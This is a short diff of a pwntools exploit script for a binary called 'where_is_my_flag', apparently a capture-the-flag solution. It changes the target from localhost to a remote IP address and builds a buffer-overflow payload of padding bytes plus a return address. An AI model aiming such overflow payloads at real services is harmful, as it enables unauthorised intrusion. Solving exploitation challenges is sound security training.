@@ -5,7 +5,7 @@ binary = './where_is_my_flag'
 
 #p = process(binary)
 #p = gdb.debug(binary, gdbscript="""""")
-p = remote("localhost", 1337)
+p = remote("51.124.222.205", 13371)
 
 payload = (72) * b'A'
 payload += p64(0x0000000000401205) # align stack (call return of main)
